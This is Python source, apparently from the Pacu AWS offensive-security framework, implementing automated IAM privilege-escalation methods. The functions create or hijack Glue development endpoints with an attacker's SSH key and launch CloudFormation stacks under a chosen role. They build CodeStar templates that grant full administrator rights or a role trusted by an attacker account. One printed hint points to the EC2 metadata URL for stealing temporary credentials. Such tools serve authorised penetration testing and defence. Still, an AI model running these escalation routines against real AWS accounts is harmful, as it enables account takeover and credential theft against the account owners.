def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method PassExistingRoleToNewGlueDevEndpoint...\n")

    pub_ssh_key = input(
        "  Enter your personal SSH public key to access the development endpoint (in the format of an authorized_keys file: ssh-rsa AAASDJHSKH....AAAAA== name) or just hit enter to skip this privilege escalation method: "
    )

    if pub_ssh_key == "":
        print("    Skipping to next privilege escalation method...\n")
        return False

    regions = pacu_main.get_regions("glue")
    region = None

    if len(regions) > 1:
        print("  Found multiple valid regions to use. Choose one below.\n")
        for i in range(0, len(regions)):
            print("  [{}] {}".format(i, regions[i]))
        choice = input(
            "What region do you want to create the Glue development endpoint in? "
        )
        region = regions[int(choice)]
    elif len(regions) == 1:
        region = regions[0]
    else:
        while not region:
            all_glue_regions = pacu_main.get_regions("glue", check_session=False)
            region = input(
                "  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: "
            )
            if not region:
                return False
            elif region not in all_glue_regions:
                print(
                    "    Region {} is not a valid Glue region. Please choose a valid region. Valid Glue regions include:\n".format(
                        region
                    )
                )
                print(all_glue_regions)
                region = None

    client = pacu_main.get_boto3_client("glue", region)

    target_role_arn = input(
        "    Is there a specific role to use? Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: "
    )

    if not target_role_arn:
        if (
            fetch_data(
                ["IAM", "Roles"],
                module_info["prerequisite_modules"][1],
                "--roles",
                force=True,
            )
            is False
        ):
            print("Pre-req module not run successfully. Exiting...")
            return False
        roles = deepcopy(session.IAM["Roles"])

        print("Found {} roles. Choose one below.".format(len(roles)))
        for i in range(0, len(roles)):
            print("  [{}] {}".format(i, roles[i]["RoleName"]))
        choice = input("Choose an option: ")
        target_role_arn = roles[int(choice)]["Arn"]

    dev_endpoint_name = "".join(
        random.choice(string.ascii_lowercase + string.digits) for _ in range(10)
    )
    print(
        "Creating Glue development endpoint {} in region {}...\n".format(
            dev_endpoint_name, region
        )
    )

    try:
        client.create_dev_endpoint(
            EndpointName=dev_endpoint_name,
            RoleArn=target_role_arn,
            PublicKey=pub_ssh_key,
            NumberOfNodes=2,
        )

        print(
            "Successfully started creation of the Glue development endpoint {}!\n".format(
                dev_endpoint_name
            )
        )
        print(
            "Now waiting for it to successfully provision, so you can get the public IP address. This takes about 5 minutes, checking-in every 30 seconds until it is ready...\n"
        )

        # TODO: Rework the permissions checker function
        # to allow a check for wildcard permission requirements
        # because in this case, I need ONE of the two of
        # glue:GetDevEndpoint and glue:GetDevEndpoints and
        # currently I can't say OR in the checks.
        # Once that is done, add a check here to see which
        # one we have and to run the appropriate commmand
        while True:
            response = client.get_dev_endpoint(EndpointName=dev_endpoint_name)
            if (
                "PublicAddress" in response["DevEndpoint"]
                and len(response["DevEndpoint"]["PublicAddress"]) > 5
            ):
                break
            time.sleep(30)

        print(
            'You can now SSH into the server and utilize the AWS CLI to use the permissions of the role, or you can exfiltrate the temporary credentials, which are stored in the EC2 metadata API. Make an HTTP request to "http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy" to get the current credentials. If that does not work, remove "dummy" from the end of that URL to get the name to use instead (it should be "dummy" though).\n'
        )
        print(
            "WARNING: Glue development endpoints take about five minutes to get up and running, so you will not be able to SSH into the server until then.\n"
        )
        print(
            "Glue development endpoint details:\n{}\n".format(
                json.dumps(response["DevEndpoint"], default=str, indent=2)
            )
        )
        return True
    except Exception as error:
        print(
            "Failed to create the Glue development endpoint {}: {}\n".format(
                dev_endpoint_name, error
            )
        )
        return False


def UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method UpdateExistingGlueDevEndpoint...\n")

    endpoint_name = input(
        "    Is there a specific Glue Development Endpoint you want to target? Enter the name of it now or just hit enter to enumerate development endpoints and view a list of options: "
    )
    pub_ssh_key = input(
        "    Enter your personal SSH public key to access the development endpoint (in the format of an authorized_keys file: ssh-rsa AAASDJHSKH....AAAAA== name) or just hit enter to skip this privilege escalation method: "
    )

    if pub_ssh_key == "":
        print("    Skipping to next privilege escalation method...\n")
        return False

    choice = 0
    if endpoint_name == "":
        if (
            fetch_data(
                ["Glue", "DevEndpoints"],
                module_info["prerequisite_modules"][5],
                "--dev-endpoints",
                force=True,
            )
            is False
        ):
            print("Pre-req module not run successfully. Exiting...")
            return False
        dev_endpoints = session.Glue["DevEndpoints"]
        print(
            "Found {} development endpoint(s). Choose one below.".format(
                len(dev_endpoints)
            )
        )
        print("  [0] Other (Manually enter development endpoint name)")
        for i in range(0, len(dev_endpoints)):
            print("  [{}] {}".format(i + 1, dev_endpoints[i]["EndpointName"]))
        choice = input("Choose an option: ")
        if int(choice) == 0:
            endpoint_name = input("    Enter a development endpoint name: ")
        else:
            endpoint_name = dev_endpoints[int(choice) - 1]["EndpointName"]
        client = pacu_main.get_boto3_client(
            "glue", dev_endpoints[int(choice) - 1]["Region"]
        )

    try:
        client.update_dev_endpoint(EndpointName=endpoint_name, PublicKey=pub_ssh_key)
        print(
            "  Successfully updated the public key associated with the Glue Development Endpoint {}. You can now SSH into it and access the IAM role associated with it through the AWS CLI.".format(
                endpoint_name
            )
        )
        if not int(choice) == 0:
            print(
                "  The hostname for this development endpoint was already stored in this session: {}".format(
                    dev_endpoints[int(choice) - 1]["PublicAddress"]
                )
            )
    except Exception as e:
        print(
            "    Failed to update Glue Development Endpoint {}:\n{}".format(
                endpoint_name, e
            )
        )
        again = input(
            "    Do you want to try again with a different development endpoint (y) or continue to the next privilege escalation method (n)? "
        )
        if again == "y":
            print(
                "      Re-running UpdateExistingGlueDevEndpoint privilege escalation attempt..."
            )
            return UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data)
        else:
            return False
    return True


def PassExistingRoleToNewCloudFormation(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method PassExistingRoleToNewCloudFormation...\n")

    target_role_arn = input(
        "    Is there a specific role to use? Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: "
    )

    if not target_role_arn:
        if (
            fetch_data(
                ["IAM", "Roles"],
                module_info["prerequisite_modules"][1],
                "--roles",
                force=True,
            )
            is False
        ):
            print("Pre-req module not run successfully. Exiting...")
            return False
        roles = deepcopy(session.IAM["Roles"])

        print("Found {} roles. Choose one below.".format(len(roles)))
        for i in range(0, len(roles)):
            print("  [{}] {}".format(i, roles[i]["RoleName"]))
        choice = input("Choose an option: ")
        target_role_arn = roles[int(choice)]["Arn"]

    regions = pacu_main.get_regions("cloudformation")
    if len(regions) > 1:
        print("  Found multiple valid regions to use. Choose one below.\n")
        for i in range(0, len(regions)):
            print("  [{}] {}".format(i, regions[i]))
        choice = input(
            "What region do you want to create the CloudFormation stack in? "
        )
        region = regions[int(choice)]
    elif len(regions) == 1:
        region = regions[0]
    else:
        while not region:
            all_cloudformation_regions = pacu_main.get_regions(
                "cloudformation", check_session=False
            )
            region = input(
                "  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: "
            )
            if not region:
                return False
            elif region not in all_cloudformation_regions:
                print(
                    "    Region {} is not a valid CloudFormation region. Please choose a valid region. Valid CloudFormation regions include:\n".format(
                        region
                    )
                )
                print(all_cloudformation_regions)
                region = None

    client = pacu_main.get_boto3_client("cloudformation", region)

    # The "a" in the beginning as it must start with a letter
    stack_name = "a" + "".join(
        random.choice(string.ascii_lowercase + string.digits) for _ in range(10)
    )

    template = None
    while not template:
        template = input(
            'You need to supply a CloudFormation template. This can be either a URL or a local file. Enter what type of path you are entering and then the path (example: "file /home/me/cf.template" or "url https://mysite.com/mytemplate.template") or just press enter to skip this privilege escalation method: '
        )
        if not template:
            print("Skipping to next privilege escalation method...\n")
            return False

        template = template.split(" ", 1)
        if len(template) == 2 and (
            template[0].lower() == "file" or template[0].lower() == "url"
        ):
            break
        else:
            template = None
            print(
                '  Received invalid input. Enter in what kind of path you are using ("file" or "url"), then a space, then the path. Example: "file /home/me/my.template". Try again!'
            )
    try:
        # The capabilities parameter will take "CAPABILITY_NAMED_IAM"
        # as valid input even if only "CAPABILITY_IAM" is required
        # and even if neither is required
        if template[0] == "url":
            response = client.create_stack(
                StackName=stack_name,
                RoleARN=target_role_arn,
                TemplateURL=template[1],
                Capabilities=["CAPABILITY_NAMED_IAM"],
            )
        elif template[0] == "file":
            with open(template[1], "r") as f:
                template_contents = f.read()
            response = client.create_stack(
                StackName=stack_name,
                RoleARN=target_role_arn,
                TemplateBody=template_contents,
                Capabilities=["CAPABILITY_NAMED_IAM"],
            )
        print(
            "Successfully started creating the CloudFormation stack {}! Here is the stack ID: {}\n".format(
                stack_name, response["StackId"]
            )
        )
        print(
            "Now waiting for creation to finish to return you the results. Checking every 20 seconds...\n"
        )
        waiter = client.get_waiter("stack_create_complete")
        waiter.wait(StackName=response["StackId"], WaiterConfig={"Delay": 20})

        response = client.describe_stacks(StackName=stack_name)
        print("Stack finished creation. Here is the output:\n")
        print(response["Stacks"])

        print(
            "Your CloudFormation resources should have been created and you should have received the output from the stack creation.\n"
        )
        return True
    except Exception as error:
        print("Failed to create the CloudFormation stack: {}\n".format(error))
        return False


def PassExistingRoleToNewDataPipeline(pacu_main, print, input, fetch_data):
    print(
        "No auto-exploitation setup for PassExistingRoleToNewDataPipeline, visit the blog for manual exploitation steps: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/\n"
    )
    return


def CodeStarCreateProjectFromTemplate(pacu_main, print, input, fetch_data):
    print(
        "No auto-exploitation setup for CodeStarCreateProjectFromTemplate, visit the blog on this privilege escalation method for a standalone exploitation script: https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api"
    )
    return


def PassExistingRoleToNewCodeStarProject(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method PassExistingRoleToNewCodeStarProject...\n")

    regions = pacu_main.get_regions("codestar")
    region = None

    if len(regions) > 1:
        print("  Found multiple valid regions. Choose one below.\n")
        for i in range(0, len(regions)):
            print("  [{}] {}".format(i, regions[i]))
        choice = input("What region do you want to create the CodeStar project in? ")
        region = regions[int(choice)]
    elif len(regions) == 1:
        region = regions[0]
    else:
        while not region:
            all_codestar_regions = pacu_main.get_regions(
                "codestar", check_session=False
            )
            region = input(
                "  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: "
            )
            if not region:
                return False
            elif region not in all_codestar_regions:
                print(
                    "    Region {} is not a valid CodeStar region. Please choose a valid region. Valid CodeStar regions include:\n".format(
                        region
                    )
                )
                print(all_codestar_regions)
                region = None

    print("    Targeting region {}...".format(region))

    target_role_arn = input(
        '    Is there a specific role to use? Enter the ARN now or just press enter to enumerate a list of possible roles to choose from (note that the CodeStar service role is given the name "aws-codestar-service-role", but may not always exist): '
    )

    if not target_role_arn:
        if (
            fetch_data(
                ["IAM", "Roles"],
                module_info["prerequisite_modules"][1],
                "--roles",
                force=True,
            )
            is False
        ):
            print("Pre-req module not run successfully. Exiting...")
            return False
        roles = deepcopy(session.IAM["Roles"])

        print("Found {} roles. Choose one below.".format(len(roles)))
        for i in range(0, len(roles)):
            print("  [{}] {}".format(i, roles[i]["RoleName"]))
        choice = input("Choose an option: ")
        target_role_arn = roles[int(choice)]["Arn"]

    client = pacu_main.get_boto3_client("codestar", region)
    active_aws_key = session.get_active_aws_key(pacu_main.database)

    project_name = "".join(random.choice(string.ascii_lowercase) for _ in range(10))

    if active_aws_key.user_name:
        codestar_cf_template = {
            "Resources": {
                project_name: {
                    "Type": "AWS::IAM::ManagedPolicy",
                    "Properties": {
                        "ManagedPolicyName": "CodeStar_" + project_name,
                        "PolicyDocument": {
                            "Version": "2012-10-17",
                            "Statement": [
                                {"Effect": "Allow", "Action": "*", "Resource": "*"}
                            ],
                        },
                        "Users": [active_aws_key.user_name],
                    },
                }
            }
        }
    elif active_aws_key.role_name:
        attacker_arn = input(
            "Detected the active keys as an IAM role, that means a new IAM role will get created with administrator permissions. What ARN should be trusted in the role's trust policy (this should likely be a user/role in your attacker account with the sts:AssumeRole permission)? "
        ).rstrip()

        codestar_cf_template = {
            "Resources": {
                project_name: {
                    "Type": "AWS::IAM::Role",
                    "Properties": {
                        "AssumeRolePolicyDocument": {
                            "Version": "2012-10-17",
                            "Statement": [
                                {
                                    "Effect": "Allow",
                                    "Principal": {"AWS": attacker_arn},
                                    "Action": "sts:AssumeRole",
                                }
                            ],
                        },
                        "MaxSessionDuration": 43200,
                        "Policies": [
                            {
                                "PolicyName": project_name,
                                "PolicyDocument": {
                                    "Version": "2012-10-17",
                                    "Statement": [
                                        {
                                            "Effect": "Allow",
                                            "Action": "*",
                                            "Resource": "*",
                                        }
                                    ],
                                },
                            }
                        ],
                        "RoleName": "CodeStarWorker-" + project_name,
                    },
                }
            }
        }

    p = (
        session_dir()
        / "modules"
        / module_info["name"]
        / "PassExistingRoleToNewCodeStarProject/codestar_cf_template.json"
    )
    p.parent.mkdir(parents=True, exist_ok=True)
    with open(p, "w+") as f:
        json.dump(codestar_cf_template, f)

    print(
        '    There are two files located at "./modules/iam__privesc_scan/PassExistingRoleToNewCodeStarProject/" that must be uploaded to an S3 bucket for this privilege escalation method (codestar_cf_template.json and empty.zip). They must also be accessible from within the account that you are attacking, so best bet is to upload them to your own S3 bucket and make them both public objects. When that is done, fill in the answers to the following questions.\n'
    )

    source_s3 = (
        input("    S3 path to empty.zip (example: bucket_name/path/to/empty.zip): ")
        .rstrip()
        .split("/", 1)
    )
    source_s3_bucket = source_s3[0]
    source_s3_key = source_s3[1]

    toolchain_s3 = (
        input(
            "    S3 path to codestar_cf_template.json (example: bucket_name/path/to/codestar_cf_template.json): "
        )
        .rstrip()
        .split("/", 1)
    )
    toolchain_s3_bucket = toolchain_s3[0]
    toolchain_s3_key = toolchain_s3[1]

    try:
        client.create_project(
            name=project_name,
            id=project_name,
            sourceCode=[
                {
                    "source": {
                        "s3": {
                            "bucketName": source_s3_bucket,
                            "bucketKey": source_s3_key,
                        }
                    },
                    "destination": {"codeCommit": {"name": project_name}},
                },
            ],
            toolchain={
                "source": {
                    "s3": {
                        "bucketName": toolchain_s3_bucket,
                        "bucketKey": toolchain_s3_key,
                    }
                },
                "roleArn": target_role_arn,
            },
        )

        if active_aws_key.user_name:
            print(
                'Successfully created CodeStar project {}. If everything went correctly, your user should have a policy attached to them named "CodeStar_{}" soon, which will grant administrator privileges. If that does not happen soon, you may need to query the project to see where it failed.'.format(
                    project_name, project_name
                )
            )
        elif active_aws_key.role_name:
            print(
                'Successfully created CodeStar project {}. If everything went correctly, a new role should be created with administrator privileges. From the user/role you supplied the ARN of earlier, use the sts:AssumeRole API to assume access to this administrator role. The role\'s ARN should look like this: "arn:aws:iam::{}:role/CodeStarWorker-{}". If that does not happen soon, you may need to query the project to see where it failed.'.format(
                    project_name, active_aws_key.account_id, project_name
                )
            )
        return True
    except Exception as error:
        print(
            "Failed to create the CodeStar project, skipping to the next privilege escalation method: {}\n".format(
                error
            )
        )
        return False


def CodeStarCreateProjectThenAssociateTeamMember(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print("  Starting method CodeStarCreateProjectThenAssociateTeamMember...\n")

    regions = pacu_main.get_regions("codestar")
    region = None

    if len(regions) > 1:
        print("  Found multiple valid regions. Choose one below.\n")
        for i in range(0, len(regions)):
            print("  [{}] {}".format(i, regions[i]))
        choice = input("What region do you want to create the CodeStar project in? ")
        region = regions[int(choice)]
    elif len(regions) == 1:
        region = regions[0]
    else:
        while not region:
            all_codestar_regions = pacu_main.get_regions(
                "codestar", check_session=False
            )
            region = input(
                "  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: "
            )
            if not region:
                return False
            elif region not in all_codestar_regions:
                print(
                    "    Region {} is not a valid CodeStar region. Please choose a valid region. Valid CodeStar regions include:\n".format(
                        region
                    )
                )
                print(all_codestar_regions)
                region = None

    print("    Targeting region {}...".format(region))

    client = pacu_main.get_boto3_client("codestar", region)
    active_aws_key = session.get_active_aws_key(pacu_main.database)

    project_name = "".join(random.choice(string.ascii_lowercase) for _ in range(10))

    try:
        client.create_project(name=project_name, id=project_name)
        print(
            "Successfully created CodeStar project {}. The next step could take up to a minute, please wait...".format(
                project_name
            )
        )
    except Exception as error:
        print(
            "Failed to create the CodeStar project, skipping to the next privilege escalation method: {}\n".format(
                error
            )
        )
        return False

    time_taken = 0
    while True:
        time.sleep(5)
        time_taken += 5
        try:
            client.associate_team_member(
                projectId=project_name,
                userArn=active_aws_key.arn,
                projectRole="Owner",
                remoteAccessAllowed=True,
            )
            break
        except Exception as error:
            # It might try to associate the team member before the IAM policy is created, so try again
            if "ProjectConfigurationException" not in str(error):
                print(
                    "Failed to associate your IAM user as a project team member, skipping to the next privilege escalation method: {}\n".format(
                        error
                    )
                )
                return False
            elif time_taken > 60:
                print(
                    "It has been over a minute and we still cannot associate your IAM user with the project. Something is wrong, considering this a fail: {}\n".format(
                        error
                    )
                )
                return False

    print(
        'Successfully associated the IAM user with the CodeStar project {}. The user should now have a managed policy named "CodeStar_{}_Owner" that will grant some additional privileges.'.format(
            project_name, project_name
        )
    )
    print(
        "    At the time of writing this exploit, the permissions of that policy would look like this:"
    )

    owner_policy = {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "1",
                "Effect": "Allow",
                "Action": [
                    "codestar:*",
                    "events:ListRuleNamesByTarget",
                    "iam:GetPolicy*",
                    "iam:ListPolicyVersions",
                ],
                "Resource": [
                    "arn:aws:codestar:{}:YOUR-ACCOUNT-ID:project/{}".format(
                        region, project_name
                    ),
                    "arn:aws:events:{}:YOUR-ACCOUNT-ID:rule/*".format(region),
                    "arn:aws:iam::YOUR-ACCOUNT-ID:policy/CodeStar_{}_Owner".format(
                        project_name
                    ),
                ],
            },
            {
                "Sid": "2",
                "Effect": "Allow",
                "Action": [
                    "codestar:DescribeUserProfile",
                    "codestar:ListProjects",
                    "codestar:ListUserProfiles",
                    "codestar:VerifyServiceRole",
                    "cloud9:DescribeEnvironment*",
                    "cloud9:ValidateEnvironmentName",
                    "cloudwatch:DescribeAlarms",
                    "cloudwatch:GetMetricStatistics",
                    "cloudwatch:ListMetrics",
                    "codedeploy:BatchGet*",
                    "codedeploy:List*",
                    "ec2:DescribeSubnets",
                    "ec2:DescribeVpcs",
                    "iam:GetAccountSummary",
                    "iam:GetUser",
                    "iam:ListAccountAliases",
                    "iam:ListRoles",
                    "iam:ListUsers",
                    "lambda:List*",
                    "sns:List*",
                ],
                "Resource": ["*"],
            },
            {
                "Sid": "3",
                "Effect": "Allow",
                "Action": [
                    "codestar:*UserProfile",
                    "iam:GenerateCredentialReport",
                    "iam:GenerateServiceLastAccessedDetails",
                    "iam:CreateAccessKey",
                    "iam:UpdateAccessKey",
                    "iam:DeleteAccessKey",
                    "iam:UpdateSSHPublicKey",
                    "iam:UploadSSHPublicKey",
                    "iam:DeleteSSHPublicKey",
                    "iam:CreateServiceSpecificCredential",
                    "iam:UpdateServiceSpecificCredential",
                    "iam:DeleteServiceSpecificCredential",
                    "iam:ResetServiceSpecificCredential",
                    "iam:Get*",
                    "iam:List*",
                ],
                "Resource": ["arn:aws:iam::YOUR-ACCOUNT-ID:user/${aws:username}"],
            },
        ],
    }

    print(json.dumps(owner_policy, indent=4))
    return True


def EditExistingLambdaFunctionWithRole(pacu_main, print, input, fetch_data):
    print("  Starting method EditExistingLambdaFunctionWithRole...\n")

    if (
        fetch_data(
            ["Lambda", "Functions"],
            module_info["prerequisite_modules"][6],
            "",
            force=True,
        )
        is False
    ):
        print("Pre-req module not run successfully. Exiting...")
        return False

    print("Completed enumeration of Lambda functions in all session regions.\n")
    print(
        strip_lines(
            """
        It is suggested to access the functions through the AWS Web Console to determine how your code edits will affect
        the function. This module does not automatically modify functions due to the high risk of denial-of-service to
        the environment. Through the AWS API, you are required to first download the function code, modify it, then
        re-upload it, but through the web console, you can just edit it inline.
    """
        )
    )
    print()
    print(
        strip_lines(
            """
        Tips: Use the AWS SDK for the language that the function is running to contact the AWS API using the credentials
        associated with the function to expand your access.
    """
        )
    )
    print()
    print(
        'You can now view the enumerated Lambda data by running the "data Lambda" command in Pacu.\n'
    )
    return True
